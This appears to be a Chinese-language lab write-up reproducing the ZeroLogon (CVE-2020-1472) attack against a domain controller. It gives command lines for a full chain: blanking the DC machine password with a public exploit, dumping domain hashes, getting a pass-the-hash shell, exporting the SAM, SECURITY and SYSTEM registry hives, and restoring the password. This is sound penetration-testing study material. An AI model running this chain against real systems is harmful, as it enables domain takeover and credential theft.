---
title: "ZeroLogon漏洞复现"
toc: true

---

# 一、什么是ZeroLogon？
Microsoft Netlogon 认证的加密模块存在缺陷，允许攻击者可以在 *没有任何凭证* 的情况下获得 `Domain Controller(DC)` 权限并更改DC密码。


# 二、详细利用步骤

{% include cast name="DANTE-DC01-ZeroLogon" %}

1.使用 [cve-2020-1472-exploit.py](https://github.com/dirkjanm/CVE-2020-1472) 攻击域控，将机器账户密码置空

```bash
python3 cve-2020-1472-exploit.py <dc-name> <dc-ip>
```

2.使用 [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) 远程dump域控上的hash

```bash
secretsdump.py <domain/dc-name>@<dc-ip> -no-pass
```

3.使用 [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) 登录域控

```bash
proxychains wmiexec.py <domain/username>@<dc-ip> -hashes LMHASH:NTHASH
```

4.拖取域控本地的hash文件 `hklm\sam`，`hklm\security`，`hklm\system`

```bash
# 导出hash
reg save hklm\sam C:\sam.save 
reg save hklm\security C:\security.save 
reg save hklm\system C:\system.save
   
# 下载hash到本地
lget sam.save 
lget security.save
lget system.save 
```

5.在本地使用 [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) 还原出机器账户的 `plain_password_hex`

```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

6.使用 `restorepassword.py` 将第一步置空的密码恢复

```bash
proxychains python3 restorepassword.py <domain/dc-name>@<dc-ip> -hexpass <plain_password_hex>
```
